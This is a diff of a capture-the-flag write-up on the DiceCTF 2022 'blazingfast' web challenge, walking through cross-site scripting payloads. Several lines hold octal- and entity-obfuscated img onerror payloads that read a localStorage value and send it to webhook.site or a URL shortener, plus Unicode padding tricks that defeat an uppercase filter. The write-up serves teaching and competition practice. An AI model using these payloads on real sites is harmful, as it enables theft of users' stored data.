@@ -496,7 +496,9 @@ Concept: Our input is written in the buffer if we use use normal ASCII caracters
 
 First we call the website with the following URL:
 
+```html
 https://blazingfast.mc.ax/?demo=.....<img src='x' onerror='alert(1)'>
+```
 
 https://blazingfast.mc.ax/?demo=.....%3Cimg%20src=%27x%27%20onerror=%27alert(1)%27%3E
 
@@ -506,13 +508,13 @@ Then, we remove the part with the payload and left the valid offset. Call the fu
 
 Now moving into crafting a payload. We have to steal the flag value from localstorage with a payload like this:
 
-```
+```html
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror="location.href='https://webhook.site/9ed73e58-c688-47c5-9ec8-826693de1421?c='+localStorage.getItem('flag')">
 ```
 
 After having some tries on figuring out how to overcome the uppercase characters, RazviOverflow came across a great idea for the URL, using a URL shortener:
 
-```
+```html
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror="location.href='http://tiny.cc/70pouz?c='+localStorage.getItem('flag')">
 ```
 
@@ -520,14 +522,15 @@ Still didn't work, since location.href or other methos like this.src didn't work
 
 Looking for a solution we tried using some octal bypasses:
 
-```
+```html
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[][filter][constructor](location.href='http://tiny.cc/70pouz?c='+localStorage.getItem('flag'))()>
 ```
 To octal:
 
-```
+```html
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\154\157\143\141\164\151\157\156\56\150\162\145\146\75\47\150\164\164\160\72\57\57\164\151\156\171\56\143\143\57\67\60\160\157\165\172\77\143\75\47\53\154\157\143\141\154\123\164\157\162\141\147\145\56\147\145\164\111\164\145\155\50\47\146\154\141\147\47\51")()>
 ```
+
 Then we bypassed the uppercase filter and got our local exploit using the URL parameter and changing the payload length:
 
 <img src="/images/writeups/DiceCTF2022/Web/2_02.png" width="70%"/>
@@ -546,13 +549,13 @@ Main idea is that ß character has length of 1, but when converted to uppercase 
 
 Then we have to add at least, the same number of ß as our payload:
 
-```
+```html
 https://blazingfast.mc.ax/?demo=ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß<img src=x onerror=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\154\157\143\141\164\151\157\156\56\150\162\145\146\75\47\150\164\164\160\72\57\57\164\151\156\171\56\143\143\57\67\60\160\157\165\172\77\143\75\47\53\154\157\143\141\154\123\164\157\162\141\147\145\56\147\145\164\111\164\145\155\50\47\146\154\141\147\47\51")()>
 ```
 
 As seen in other writeups, we can also use XML encoding for the characters instead of octal:
 
-```
+```html
 https://blazingfast.mc.ax/?demo=ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=&#X6c;&#X6f;&#X63;&#X61;&#X74;&#X69;&#X6f;&#X6e;.&#X68;&#X72;&#X65;&#X66;=&#X27;https://webhook.site/9ed73e58-c688-47c5-9ec8-826693de1421?q=&#X27.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;()&#X2B;&#X6c;&#X6f;&#X63;&#X61;&#X6c;&#X53;&#X74;&#X6f;&#X72;&#X61;&#X67;&#X65;.&#X67;&#X65;&#X74;&#X49;&#X74;&#X65;&#X6d;(&#X27;flag&#X27;.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;())>
 ```
 
